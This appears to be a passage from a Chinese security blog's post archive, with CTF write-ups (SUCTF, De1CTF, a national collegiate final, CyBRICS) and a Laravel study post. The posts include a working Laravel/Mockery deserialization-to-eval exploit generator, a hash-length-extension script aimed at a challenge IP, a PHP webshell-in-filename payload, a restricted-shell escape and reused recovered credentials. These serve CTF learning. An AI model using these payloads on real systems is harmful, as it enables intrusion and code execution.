+ hex(e)f = (ans &gt;&gt; 18) &amp; 0x1ff #ans的倒数第3个9位# print \"ans的倒数第3个9位 --&gt; \" + hex(f)h = (d &amp; e) ^ f #结果的倒数第3个9位# print \"结果的倒数第3个9位 --&gt; \" + hex(h)i = h &amp; 0x1f #取5位j = p &gt;&gt; 27 #p的高5位k = ans &gt;&gt; 27 #ans 的高5位l = (i &amp; j) ^ k #结果的高5位# print \"结果的高5位 --&gt; \" + hex(l)res = (l &lt;&lt; 27) + (h &lt;&lt; 18) + (d &lt;&lt; 9) + a#第一轮结果print \"first\"print hex(res)# 验证通过a = res &gt;&gt; 19#结果的高13位# print \"结果的高13位 --&gt; \" + hex(a)b = (res &gt;&gt; 6) &amp; 0x1fff #res的中间13位# print \"res的中间13位 --&gt; \" + hex(b)c = a ^ b #结果的中间13位# print \"结果的中间13位 --&gt; \" + hex(c)d = c &gt;&gt; 7 #取6位e = res &amp; 0x3ff = d ^ e # 结果的低6位# print \"结果的低6位 --&gt; \" + hex(f)ans = (a &lt;&lt; 19) + (c &lt;&lt; 6) + f #一段flagprint \"flag\"print hex(ans) 参考https://blog.zeddyu.info/2019/08/24/SUCTF-2019/https://xz.aliyun.com/t/6042https://www.cnblogs.com/wfzWebSecuity/p/11207145.html","comments":true,"permalink":"https://xi4or0uji.github.io/2019/08/25/2019-SUCTF-wp/","categories":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"2019 De1CTF wp","date":"2019-08-06T16:00:00.000Z","path":"2019/08/07/2019-De1CTF-wp/","text":"又是一场打了n久才补题解的比赛orz…… WEBSSRF ME一道简单的哈希长度扩展攻击签到题先看源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101#! /usr/bin/env python#encoding=utf-8from flask import Flaskfrom flask import requestimport socketimport hashlibimport urllibimport sysimport osimport jsonreload(sys)sys.setdefaultencoding('latin1')app = Flask(__name__)secert_key = os.urandom(16)class Task: def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr os.mkdir(self.sandbox) def Exec(self): result = &#123;&#125; result['code'] = 500 if (self.checkSign()): if \"scan\" in self.action: tmpfile = open(\"./%s/result.txt\" % self.sandbox, 'w') resp = scan(self.param) if (resp == \"Connection Timeout\"): result['data'] = resp else: print resp tmpfile.write(resp) tmpfile.close() result['code'] = 200 if \"read\" in self.action: f = open(\"./%s/result.txt\" % self.sandbox, 'r') result['code'] = 200 result['data'] = f.read() if result['code'] == 500: result['data'] = \"Action Error\" else: result['code'] = 500 result['msg'] = \"Sign Error\" return result def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False#generate Sign For Action Scan.@app.route(\"/geneSign\", methods=['GET', 'POST'])def geneSign(): # hashlib.md5(secert_key + param + action).hexdigest() param = urllib.unquote(request.args.get(\"param\", \"\")) action = \"scan\" return getSign(action, param)@app.route('/De1ta',methods=['GET','POST'])def challenge(): action = urllib.unquote(request.cookies.get(\"action\")) param = urllib.unquote(request.args.get(\"param\", \"\")) sign = urllib.unquote(request.cookies.get(\"sign\")) ip = request.remote_addr if(waf(param)): return \"No Hacker!!!!\" task = Task(action, param, sign, ip) return json.dumps(task.Exec())@app.route('/')def index(): return open(\"code.txt\",\"r\").read()def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return \"Connection Timeout\"def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest()def md5(content): return hashlib.md5(content).hexdigest()def waf(param): check=param.strip().lower() if check.startswith(\"gopher\") or check.startswith(\"file\"): return True else: return Falseif __name__ == '__main__': app.debug = False app.run(host='0.0.0.0',port=80) 当action为scan的时候，可以将param的文件复制到自己的沙盒的result.txt里面，然后read的时候读result.txt文件geneSign能拿到action=scan，param=flag.txt的哈希值，但是拿不到read的哈希值，因此我们哈希扩展一波拿哈希值，exp如下1234567891011import requestsnum = 16secret = \"a\" * numsecret_str = secret + 'scan' + '\\80'value = 'read'padding = 64 - len(secret_str) - 8secret_str = '%80' + '%00'*padding + '%a0' + '%00'*7 + valueurl = r'http://139.180.128.86/De1ta?param=scan'cookie = &#123;'action': secret_str, 'sign': '4e5e3cd2e040a695869c672ada5af0dd'&#125;res = requests.get(url, cookies=cookie).contentprint res shellshellshell一道组合的内网题 giftbox菜鸡太菜了，只能来复现一波ls看一下有什么文件可读然后login处有注入，真返回incorrect，假返回not found然后就是写个脚本注入一下就能拿到一个hint告诉你还有一个隐藏的命令，看了一下好像还有一个eval函数，但是在launch的时候调用同时这个shell是受限制的，所以很多命令不能直接执行，这里可以用php可变变量拼接出语句","comments":true,"permalink":"https://xi4or0uji.github.io/2019/08/07/2019-De1CTF-wp/","categories":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"laravel框架学习","date":"2019-08-04T16:00:00.000Z","path":"2019/08/05/laravel框架学习/","text":"前段时间国赛打自闭了，框架一个接一个，菜鸡还没开始好好研究就已经要用了，学习一波，如有错误，烦请大佬斧正 安装鉴于菜鸡安装还是踩了一点坑，所以记录一下首先第一点，不要用一键安装包！！！千万不要用！！搭建过程虽然省事，但是启动以后一堆bug，菜鸡调试半天都没能解决完，最后还是弃坑，自己搭再接下来就是自己先搭一个服务器环境，菜鸡是在window搭建的，所以就直接用了xampp去搭建，省事还快捷，下载安装就行了，这里注意一点，因为laravel大量使用php的新特性，所以下载xampp的时候最好使用最新版，以免出现不兼容的情况 composer因为laravel框架需要用到composer进行管理，所以我们需要先下载安装，网址如下1https://docs.phpcomposer.com/00-intro.html 下载下来基本无脑next就行，中间找php解释器的时候如果安装程序不能自动找到就自己找一下给个路径，最后顺带选择同意让他将系统的环境变量配好，安装完成以后测试一下，在命令框输入composer，如果出现下图，那就基本安装好了 laravel安装好composer，重启一下apache，就可以开始安装laravel了，这里安装还是很简单的首先命令行进入xampp下的htdocs文件夹1cd xampp/htdocs/ 然后运行1composer create-project laravel/laravel --prefer-dist 这个时候如果结果如下图而且htdocs目录下有个laravel文件夹，就基本能下载安装框架成功了但是如果出下如下错误123[Composer\\Downloader\\TransportException] The \"https://packagist.org/p/symfony/polyfill-ctype%24de39fcb04af7704e77b309de60f85b9a505bd04379afd8bbff7ada66e1478fb8.json\" file could not be downloaded (HTTP/1.1 404 Not Found) 则需要先运行以下两句命令12composer clear-cachecomposer dump-autoload 然后再用composer去运行上面的创建项目语句，如果结果如上所说，就基本成功最后再访问一下http://localhost/laravel/public/index.php（具体路径根据自己的目录而定，出现下图的话，恭喜你，laravel框架成功搭建 前置知识反射反射之前菜鸡也写过一篇博客，这里就直接贴代码不解释了，结合php开发手册估计基本都能理解123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960&lt;?phpclass test&#123; public $name = \"Ariel\"; private $nickname = \"Xi4or0uji\"; protected $gender; private function get()&#123; $this -&gt; name = \"Ariel\"; return $this-&gt;name; &#125; public function hello()&#123; return \" hello world\"; &#125;&#125;//获取类$obj = new ReflectionClass(\"test\");//获得类名$classname = $obj -&gt; getName();echo \"classname: \".$classname.\"&lt;br&gt;\";$methods = $properties = [];//获得属性名foreach ($obj -&gt; getProperties() as $v)&#123; $properties[$v -&gt; getName()] = $v;&#125;ksort($properties);foreach ($properties as $k =&gt; $v)&#123; if ($v -&gt; isPrivate())&#123; echo $v.\" is public\".\"&lt;br&gt;\"; &#125; if ($v -&gt; isProtected())&#123; echo $v.\"is protected\".\"&lt;br&gt;\"; &#125; if ($v -&gt; isPrivate())&#123; echo $v.\"is private\".\"&lt;br&gt;\"; &#125;&#125;//获得方法名foreach ($obj -&gt; getMethods() as $v)&#123;// echo $v-&gt;getName().\"&lt;br&gt;\"; $methods[$v -&gt; getName()] = $v;&#125;ksort($methods);foreach ($methods as $k =&gt; $v)&#123; echo \"function is \".$k.\"&lt;br&gt;\";&#125;//调用$test = new test();$ref = new ReflectionClass($test);$method = $ref -&gt; getMethod(\"get\");$method -&gt; setAccessible(true); //调用私有函数需要设置print $method-&gt;invoke($test);//这种写法也可以$ref = new ReflectionClass('test');$instance = $ref -&gt; newInstanceArgs(); //相当于实例化test类$method = $ref-&gt;getMethod('get');$method -&gt; setAccessible(true); //调用私有函数需要设置echo $method -&gt; invoke($instance); 还有一个thinkphp的反射？菜鸡没实验成功，就贴链接吧1https://www.cnblogs.com/52php/p/5675237.html 自加载与命名空间手动加载这些基本都是直接贴代码+注释，不作详细的讲解2333 include查找顺序：12345include参数没路径：include_path执行的目录 -&gt; 脚本文件所在的目录和当前工作目录include参数有路径：include参数的目录 -&gt; 脚本文件所在的目录和当前工作目录如果找不到只发出warming 具体加载过程class.php123456&lt;?phpclass Test&#123; static public function get()&#123; echo \"hello\"; &#125;&#125; load.php1234567891011121314&lt;?phpecho \"1\".\"&lt;br&gt;\";$ret = include \"class.php\";echo sprintf(\"include ret-value: %d, ret-type: %s &lt;br&gt;\", $ret, gettype($ret));Test::get();//包含不存在的文件echo \"&lt;br&gt;\".\"2\".\"&lt;br&gt;\";$ret1 = include \"./class1.php\";echo sprintf(\"include ret-value: %d, ret-type: %s &lt;br&gt;\", $ret1, gettype($ret1));//重复包含echo \"&lt;br&gt;\".\"3\".\"&lt;br&gt;\";$ret2 = include \"./class.php\";echo sprintf(\"include ret-value: %d, ret-type: %s &lt;br&gt;\", $ret2, gettype($ret2));Test::get(); 结果结论123include成功返回1，失败返回falseinclude失败只会返回warning，不会中断运行include不能重复包含，会直接报错 include_once12345678910111213echo \"1\".\"&lt;br&gt;\";$ret = include_once \"class.php\";echo sprintf(\"include ret-value: %d, ret-type: %s &lt;br&gt;\", $ret, gettype($ret));Test::get();echo \"&lt;br&gt;\".\"2\".\"&lt;br&gt;\";$ret1 = include_once \"./class1.php\";echo sprintf(\"include ret-value: %d, ret-type: %s &lt;br&gt;\", $ret1, gettype($ret1));//类重复加载echo \"&lt;br&gt;\".\"3\".\"&lt;br&gt;\";$ret2 = include_once \"./class.php\";echo sprintf(\"include ret-value: %d, ret-type: %s &lt;br&gt;\", $ret, gettype($ret));Test::get(); 结果结论12其实跟include差不多，成功包含返回1，但是可以重复加载，其实也不能算是重复加载，是直接用之前包含了的 文件不存在也只是报warming，不影响后面执行 require不放代码和图片了，跟include差不多，成功包含返回1，但是重复包含会报错，包含不存在的文件也会报错 require_once跟include_once差不多，成功包含返回1，可以重复包含，但包含不存在的文件会报错 __autoload这里我们还是拿原来那个类，但是命名规范一点test.php123456&lt;?phpclass Test&#123; static public function get()&#123; echo \"hello\"; &#125;&#125; load.php123456//__autoloadfunction __autoload($classname)&#123; $filename = \"./\".lcfirst($classname).\".php\"; include_once ($filename);&#125;Test::get(); 这个方法会自动加载没包含进去的类，如果找不到就报错，最后运行直接就出hello了，但是菜鸡在官方文档看到这一句12WarningThis feature has been DEPRECATED as of PHP 7.2.0. Relying on this feature is highly discouraged. 菜鸡的php环境是7.2.1，居然还能用（摊手 spl_autoload_register官方文档对此函数解释如下12将函数注册到SPL __autoload函数队列中。如果该队列中的函数尚未激活，则激活它们。如果在你的程序中已经实现了__autoload()函数，它必须显式注册到__autoload()队列中。 先贴个代码1234567891011121314151617181920212223242526272829303132//test.phpclass Test&#123; static public function get()&#123; echo \"hello f1\"; &#125;&#125;//ttt.class.phpclass Ttt&#123; static public function test()&#123; echo \"hello f2\"; &#125;&#125;//load.php//spl_autoload_register$load1 = function ($classname)&#123; echo \"load1\".\"&lt;br&gt;\"; $filename = \"./\".lcfirst($classname).\".php\"; include_once ($filename);&#125;;$load2 = function ($classname)&#123; echo \"load2\".\"&lt;br&gt;\"; $filename = \"./\".lcfirst($classname).\".class.php\"; include_once ($filename);&#125;;spl_autoload_register($load1);spl_autoload_register($load2);Test::get();Ttt::test(); 先放个回显菜鸡尝试了一波，具体流程是spl队列里面放了两个函数，一个load1，一个load2，接下下面调用两个类的方法，队列首先出来一个load1的方法，去寻找有test.php文件，找到了就执行里面的get函数，接着就寻找ttt.php文件，找不到就结束当前的函数，接着队列弹出下一个函数load2，接着去执行当时没有执行的类，然后就寻找ttt.class.php文件并执行 命名空间这个部分菜鸡还是直接贴代码&amp;总结，8具体解释了12 mockery组件反序列化分析几天前ph牛在小密圈发了之前code breaking lumenserial的官方exp，遂学习一波1O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:&#123;S:9:\"\\00*\\00events\";O:25:\"Illuminate\\Bus\\Dispatcher\":1:&#123;S:16:\"\\00*\\00queueResolver\";a:2:&#123;i:0;O:25:\"Mockery\\Loader\\EvalLoader\":0:&#123;&#125;i:1;S:4:\"load\";&#125;&#125;S:8:\"\\00*\\00event\";O:38:\"Illuminate\\Broadcasting\\BroadcastEvent\":1:&#123;S:10:\"connection\";O:32:\"Mockery\\Generator\\MockDefinition\":2:&#123;S:9:\"\\00*\\00config\";O:35:\"Mockery\\Generator\\MockConfiguration\":1:&#123;S:7:\"\\00*\\00name\";S:7:\"abcdefg\";&#125;S:7:\"\\00*\\00code\";S:25:\"&lt;?php phpinfo(); exit; ?&gt;\";&#125;&#125;&#125; 入口还是那个熟悉的配方，嗯，就是PendingBroadcasting那个类在Illuminate\\Broadcasting\\PendingBroadcasting.php里面有个__destruct函数，没错，又是这个函数…….12345public function __destruct()&#123;// $this-&gt;events-&gt;dispatch(protected $this-&gt;event); $this-&gt;events-&gt;dispatch($this-&gt;event);&#125; 而这两个参数$this-&gt;event和$this-&gt;events，都是可以控制的，再找一下别的类有没有dispatch这个方法，ph大师傅给了Illuminate\\Bus\\Dispatcher里面的dispatch方法12345678public function dispatch($command)&#123;// if (protected $this-&gt;queueResolver &amp;&amp; instanceof $this-&gt;commandShouldBeQueued($command)) if ($this-&gt;queueResolver &amp;&amp; $this-&gt;commandShouldBeQueued($command)) &#123; return $this-&gt;dispatchToQueue($command); &#125; return $this-&gt;dispatchNow($command);&#125; 先看前面的if有两个条件，第一个是$this-&gt;queueResolver，另一个则是$this-&gt;commandShouldBeQueued($command)，而$this-&gt;queueResolver这个参数是可控的，跟过去commandShouldBeQueued方法看一下1234protected function commandShouldBeQueued($command)&#123; return $command instanceof ShouldQueue;&#125; ShouldQueue是一个接口，所以这个只要满足继承了这个接口就行了，这里ph牛用了Illuminate\\Broadcasting\\BroadcastEvent这个类1234class BroadcastEvent implements ShouldQueue&#123; ......&#125; 所以这两个条件都是能满足的，再跟下去dispatchToQueue函数看一下有什么1234567public function dispatchToQueue($command)&#123; $connection = $command-&gt;connection ?? null;// $queue = call_user_func(protected $this-&gt;queueResolver, $command-&gt;connnetction); $queue = call_user_func($this-&gt;queueResolver, $connection); ......&#125; 很愉快地看到了call_user_func，包含两个参数，$this-&gt;queueResolver就是上面的dispatch的那个参数，而$connection是由传参$command决定的再接着就是找个能调用的方法了，这里ph牛给了个Mockery\\Loader\\EvalLoader类1234567891011class EvalLoader implements Loader&#123; public function load(MockDefinition $definition) &#123; if (class_exists($definition-&gt;getClassName(), false)) &#123; return; &#125; eval(\"?&gt;\" . $definition-&gt;getCode()); &#125;&#125; 这个类很简短，里面只有个load方法，还有个eval，所以接下来我们就是要想办法让class_exists($definition-&gt;getClassName(), false)返回false，控制$definition-&gt;getCode()这个值啦先跟过去看getClassName方法1234567891011121314151617namespace Mockery\\Generator;class MockDefinition&#123; protected $config; protected $code; public function getClassName() &#123; return $this-&gt;config-&gt;getName(); &#125; public function getCode() &#123; return $this-&gt;code; &#125;&#125; 发现getClassName调用的是getName，继续跟过去，代码只放关键部分123456789101112namespace Mockery\\Generator;class MockConfiguration&#123; protected $name; public function getName() &#123; return $this-&gt;name; &#125; &#125; 可以看到getName会返回$name，而这个参数是可控的，至此，我们已经可以成功控制class_exists($definition-&gt;getClassName(), false)的返回值了最后看一下$definition-&gt;getCode()方法的返回值，上面贴的代码可以看到，返回的code也是可控的，所以pop已经很清晰了1234利用PendingBroadcast的__destruct方法调用Dispatcher的dispatch方法利用BroadcastEvent满足$this-&gt;commandShouldBeQueued($command)这个条件，接着调用dispatchToQueue方法利用dispatchToQueue方法去调用EvalLoader的load方法控制MockDefinition和MockConfiguration的变量使load方法的if条件返回false，最后成功执行eval exp如下123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115&lt;?phpnamespace Illuminate\\Broadcasting&#123; class PendingBroadcast&#123; protected $event; protected $events; function __construct($event, $events) &#123; $this-&gt;event = $event; $this-&gt;events = $events; &#125;// function __destruct()// &#123;// $this-&gt;events-&gt;dispatch($this-&gt;event);// &#125; &#125;&#125;namespace Illuminate\\Bus&#123; class Dispatcher&#123; protected $queueResolver; function __construct($queueResolver) &#123; $this-&gt;queueResolver = $queueResolver; &#125;// public function dispatch($command)// &#123;//// if (protected $this-&gt;queueResolver &amp;&amp; instanceof $this-&gt;commandShouldBeQueued($command))// if ($this-&gt;queueResolver &amp;&amp; $this-&gt;commandShouldBeQueued($command)) &#123;// return $this-&gt;dispatchToQueue($command);// &#125;//// return $this-&gt;dispatchNow($command);// &#125; &#125;&#125;namespace Illuminate\\Broadcasting&#123; class BroadcastEvent&#123; protected $connection; function __construct($connection) &#123; $this-&gt;connection = $connection; &#125; &#125;&#125;namespace Mockery\\Loader&#123; class EvalLoader&#123; public function load(MockDefinition $definition) &#123;// if (class_exists($definition-&gt;getClassName(), false)) &#123;// return;// &#125;// eval(\"?&gt;\" . $definition-&gt;getCode()); &#125; &#125;&#125;namespace Mockery\\Generator&#123; class MockDefinition&#123; protected $config; protected $code; function __construct($config) &#123; $this-&gt;config = $config; $this-&gt;code = \"&lt;?php phpinfo(); ?&gt;\"; &#125; &#125; class MockConfiguration&#123; protected $name; function __construct() &#123; $this-&gt;name = \"abcd\"; &#125; &#125;&#125;namespace &#123; $EvalLoader = new Mockery\\Loader\\EvalLoader(); $queueResolver = [$EvalLoader,\"load\"]; $MockConfiguration = new Mockery\\Generator\\MockConfiguration(); $MockDefinition = new Mockery\\Generator\\MockDefinition($MockConfiguration); $BroadcastEvent = new Illuminate\\Broadcasting\\BroadcastEvent($MockDefinition); $Dispatcher = new Illuminate\\Bus\\Dispatcher($queueResolver); $PendingBroadcast = new Illuminate\\Broadcasting\\PendingBroadcast($BroadcastEvent, $Dispatcher); echo urlencode(serialize($PendingBroadcast));&#125; 参考https://www.php.net/manual/zh/https://segmentfault.com/a/1190000012203213https://segmentfault.com/a/1190000004851664","comments":true,"permalink":"https://xi4or0uji.github.io/2019/08/05/laravel框架学习/","categories":[{"name":"WEB","slug":"WEB","permalink":"https://xi4or0uji.github.io/categories/WEB/"}],"tags":[{"name":"laravel","slug":"laravel","permalink":"https://xi4or0uji.github.io/tags/laravel/"}]},{"title":"2019全国大学生信息安全竞赛决赛wp","date":"2019-07-27T16:00:00.000Z","path":"2019/07/28/2019全国大学生信息安全竞赛决赛wp/","text":"这场比赛菜鸡虽然很菜，但是还是要记一下做题过程加赛后复现 c12这题第十二题是一题web题，源码也不是很多，我们可以先审计一下user.php内容如下12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?phpinclude \"config.php\";include \"function.php\";$username=\"\";if (!is_login() &amp;&amp; !isset($_POST[\"username\"]) &amp;&amp; !isset($_POST[\"password\"]))&#123; header('Location: index.php'); die;&#125;if ($username===\"\")&#123; $stmt=$con-&gt;prepare(\"select * from users where username=?\"); $stmt-&gt;bind_param(\"s\",$_POST[\"username\"]); $stmt-&gt;execute(); $result=$stmt-&gt;get_result(); $row=$result-&gt;fetch_assoc(); if ($row[\"password\"]===$_POST[\"password\"]) &#123; $username=$_POST[\"username\"]; setcookie(\"username\",encode($username,$secret)); &#125; else &#123; header('Location: index.php'); die; &#125;&#125;$admin_html=&lt;&lt;&lt;EOFHello, admin!&lt;form action=\"upload.php\" method=\"post\"enctype=\"multipart/form-data\"&gt;&lt;label for=\"file\"&gt;Filename:&lt;/label&gt;&lt;input type=\"file\" name=\"file\" id=\"file\" /&gt; &lt;br /&gt;&lt;input type=\"submit\" name=\"submit\" value=\"Submit\" /&gt;&lt;/form&gt;EOF;if ($username!==\"admin\")&#123; echo \"Hello, &#123;$username&#125;, if you are admin, I will give you a surprise.\";&#125;else&#123; echo $admin_html;&#125; 很明显可以看到，只要过了!is_login() &amp;&amp; !isset($_POST[&quot;username&quot;]) &amp;&amp; !isset($_POST[&quot;password&quot;])这个条件，只要username是admin就能直接以管理员的身份登录进去接下来就是跟过去看一下is_login判断的是什么了12345678function is_login()&#123; global $username,$secret; if (!isset($_COOKIE[\"username\"])) return false; $username=decode($_COOKIE[\"username\"],$secret); return true;&#125; 登录验证也很简单，没有cookie就直接返回没登录，有的话decode出来的username就是用户了而且encode和decode也都给了1234567891011121314151617181920function encode($str,$key)&#123; $tmp=\"\"; for ($i=0;$i&lt;strlen($str);$i++) &#123; $tmp .= chr(ord($str[$i])^ord($key[$i%strlen($key)])); &#125; return base64_encode($tmp);&#125;function decode($str,$key)&#123; $str=base64_decode($str); $tmp=\"\"; for ($i=0;$i&lt;strlen($str);$i++) &#123; $tmp .= chr(ord($str[$i])^ord($key[$i%strlen($key)])); &#125; return $tmp;&#125; 最最最值得说的是，连secret都给了$secret=&quot;!*(fp60zoy&quot;;接下来直接按着他的方式加密过去改下cookie就能直接登录进去了123456789101112function encode($str,$key)&#123; $tmp=\"\"; for ($i=0;$i&lt;strlen($str);$i++) &#123; $tmp .= chr(ord($str[$i])^ord($key[$i%strlen($key)])); &#125; return base64_encode($tmp);&#125;$secret=\"!*(fp60zoy\";$username = \"admin\";echo encode($username, $secret); 登录进去以后就能看到一个文件上传的框了，再跟过去看一下upload的源码，这个只放关键部分1234567891011121314151617181920&lt;?phpis_login();if ($username!==\"admin\")&#123; //一个waf&#125;if (!$_FILES[\"file\"][\"name\"])&#123; //又一个waf&#125;$file_name=$_FILES[\"file\"][\"name\"];if (preg_match(\"/php/i\",$file_name))&#123; //再来一个waf&#125;file_put_contents(\"logs/upload.log.php\",\"User &#123;$username&#125; uploaded file &#123;$file_name&#125;.\\n\",FILE_APPEND);echo \"I logged the file name you uploaded. LOL&lt;script&gt;setTimeout('location.href=\\\"user.php\\\"',3000);&lt;/script&gt;\"; 可以看到，即使我们过了各种waf，也只是将文件名写进去upload.log.php文件里面而已，但是我们可以控制文件名鸭，所以接下来就是控制文件名写个shell了，因为php不能用，所以我们可以直接&lt;? xxx去让php执行，所以最后就是&lt;?= 123； var_dump(file_get_content(&#39;/flag&#39;)); ?&gt;去拿flag了","comments":true,"permalink":"https://xi4or0uji.github.io/2019/07/28/2019全国大学生信息安全竞赛决赛wp/","categories":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"CyBRICS CTF Quals 2019 wp","date":"2019-07-21T16:00:00.000Z","path":"2019/07/22/CyBRICS-CTF-Quals-2019-wp/","text":"前段时间看到了这个比赛，于是就打了一波了，菜鸡还是一如既往的菜 warmup这个是个web的签到题，菜鸡具体不太记得了，好像是有个index.html，也有个final.html，访问index.html就会自动跳转到final.html，但是抓包就能看到flag了 ProCTF这题ssh过去是一个受了限制的shell，但是按两次tab可以稍稍可用多一点命令，但是基本的命令也还是用不了，到了这里似乎卡死了，可是我们可以用shell(&#39;sh&#39;) .去获得一个shell123456789?- shell('sh') .$ cd /home$ lsuser$ cd user$lsflag.txt$ cat flag.txtcybrics&#123;feeling_like_a_PRO?_that_sounds_LOGical_to_me!__g3t_it?_G37_1T?!?!_ok_N3v3Rm1nd...&#125; Paranoid题目描述如下123My neighbors are always very careful about their security. For example they’ve just bought a new home Wi-Fi router, and instead of just leaving it open, they instantly are setting passwords!Don’t they trust me? I feel offended.Can you give me their current router admin pw? 这个题目拿下来是一个压缩包，解压出来是一个流量包，打开以后数据成千上万，但是我们注意到题目说了管理员修改了密码，所以我们可以先查看一下post数据有哪些，用http.request.method == POST进行过滤，可以看到第二个数据包有个WLAN_AP_WEP_KEY是Xi1nvy5KGSgI2把这个wep密钥添加进去wireshark的解密密钥这个时候再打开数据包就会看到更加多的数据，继续过滤post数据，接着就找到第二个密码2_RGR_xO-uiJFiAxdA33-PsdanuK了然后继续将wpa密钥放进去解密密钥，这里菜鸡就解不出了，对802.11协议不了解 Sender这个题目拿下来是一个smtp的发送数据包，内容如下12345678910111213141516171819202122232425262728293031323334353637220 ugm.cybrics.net ESMTP Postfix (Ubuntu)EHLO localhost250-ugm.cybrics.net250-PIPELINING250-SIZE 10240000250-VRFY250-ETRN250-AUTH PLAIN LOGIN250-ENHANCEDSTATUSCODES250-8BITMIME250 DSNAUTH LOGIN334 VXNlcm5hbWU6ZmF3a2Vz //fawkes334 UGFzc3dvcmQ6Q29tYmluNHQxb25YWFk= //Combin4t1onXXY235 2.7.0 Authentication successfulMAIL FROM: &lt;fawkes@ugm.cybrics.net&gt;250 2.1.0 OkRCPT TO: &lt;area51@af.mil&gt;250 2.1.5 OkDATA354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;From: fawkes &lt;fawkes@ugm.cybrics.net&gt;To: Area51 &lt;area51@af.mil&gt;Subject: add - archive pwContent-Type: text/plain; charset=\"iso-8859-1\"Content-Transfer-Encoding: quoted-printableMIME-Version: 1.0=62=74=77=2E=0A=0A=70=61=73=73=77=6F=72=64 =66=6F=72 =74=68=65 =61=72=63==68=69=76=65 =77=69=74=68 =66=6C=61=67=3A =63=72=61=63=6B=30=57=65=73=74==6F=6E=38=38=76=65=72=74=65=62=72=61=0A=0A=63=68=65=65=72=73=21=0A.250 2.0.0 Ok: queued as C4D593E8B6QUIT221 2.0.0 Bye 其他的可以忽略，重点是这个123=62=74=77=2E=0A=0A=70=61=73=73=77=6F=72=64 =66=6F=72 =74=68=65 =61=72=63==68=69=76=65 =77=69=74=68 =66=6C=61=67=3A =63=72=61=63=6B=30=57=65=73=74==6F=6E=38=38=76=65=72=74=65=62=72=61=0A=0A=63=68=65=65=72=73=21=0A 这一段解密出来是123btw.password for the archive with flag: crack0Weston88vertebracheers! 然后就是远程连接过去getflag12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849telnet ugm.cybrics.net 110+OK Dovecot ready.user fawkes+OKpass Combin4t1onXXY+OK Logged in.list+OK 1 messages:1 138808retr 1+OK 138808 octetsReturn-Path: &lt;fawkes@ugm.cybrics.net&gt;X-Original-To: fawkes@ugm.cybrics.netDelivered-To: fawkes@ugm.cybrics.netReceived: by sender (Postfix, from userid 1000) id B83843EBFF; Thu, 18 Jul 2019 16:41:23 +0000 (UTC)Date: Thu, 18 Jul 2019 16:41:23 +0000From: fawkes &lt;fawkes@ugm.cybrics.net&gt;To: Area51 &lt;area51@af.mil&gt;, fawkes &lt;fawkes@ugm.cybrics.net&gt;Subject: interesting archiveMessage-ID: &lt;20190718164123.GA9631@ugm.cybrics.net&gt;MIME-Version: 1.0Content-Type: multipart/mixed; boundary=\"J2SCkAp4GZ/dPZZf\"Content-Disposition: inlineUser-Agent: Mutt/1.5.24 (2015-08-30)--J2SCkAp4GZ/dPZZfContent-Type: text/plain; charset=us-asciiContent-Disposition: inlinetake a look. dont share. secret.--J2SCkAp4GZ/dPZZfContent-Type: application/zipContent-Disposition: attachment; filename=\"secret_flag.zip\"Content-Transfer-Encoding: base64UEsDBBQACQBjAMua8k6A+vIXUogBAA+iAQAPAAsAc2VjcmV0X2ZsYWcucGRmAZkHAAEAQUUDCAC1GtwFWQRy7mwXUpknBhOJ3hpnDv1ei1Kf+knOhoW61yeyPdnML4vSrff+GUxQYCGKz6SBtxgPjLvcWjoZokQBxFczx5575Z8Wv6dcwrX2X5A4WUFP+vpXBeq7E/c1Q7T87mR2WJnrhqLs253Zoz1KC2kq+Gs/KXZILyxSzFWW6h7YLlozE6ru/f8WGtlLZzw5CXMdTcaZFGBjJX9jsqqYJOuHfGp0t0r43PczpGc54kyoPA1I42qeeEmgSqjUQa9fOxKhjzKruGtDKxN9Ri+uhtSsVXM7dDyHxIOdMk3u1TQLaCphtH5Sa1LSGjAi0+Fj8vKxn4rWTPr2d934IQ9CuLW87u/q+Wxp3LsnTQpoleb0+v9DxUxjavkdB7822Zz7is6emW76utY0q6MosRWhbRAmlGC8/Bs8qaido/ni0gQLxZRwGF6fn1XC0LBA/2CBKd/4Sxi8+lo2SGo+RsldM5CD2SZH2HFyHFOo+GIkaaJOsEfRcW0TytEYZ9VWofK7FUfRH/pqFqsoQTzmJy3zX4xsuXAT09gKXqK6FVKp8Bg44s2Vt4OO69LE1Be/TRmYYd8h2+4LxOEHdOkQ7IfWfu9Z9zSI0sP0uk+giO85D7Diw57Didf176pJ9cawA9VhZkMOzitWc/woAE/nfDwgrYJRMYWbtf23GPr0oMKNkQuJi3eQzcpoY9x3zsJVizqYeSR2dnsaYfl8ijpmfFC0cal8EZkv7PjHMiWqE2O4GVjIqxQRWfXp6UGPMvYYJjhQiuV4hMtiMS/wVN00Yy9TV0C9zW15DaeENYbgEIV11eLGfmh0YQLWmFrzvi1u09Kke12izEPqrqf2xNmP+7YHM29PHpNX1r1nNJr4Bsv36Z9DIRHvnsn5zP2hBKJVCsO+J4zGHwoNA1ufb8eTWJ1leXUZmuGy6Sl2FxTzP9dbI7FiylO7eBa61vzMSeKfa857/O4UhikwmIfzpK7QuUzN6bL7uMj6ESyvcT08ReJY8Wxe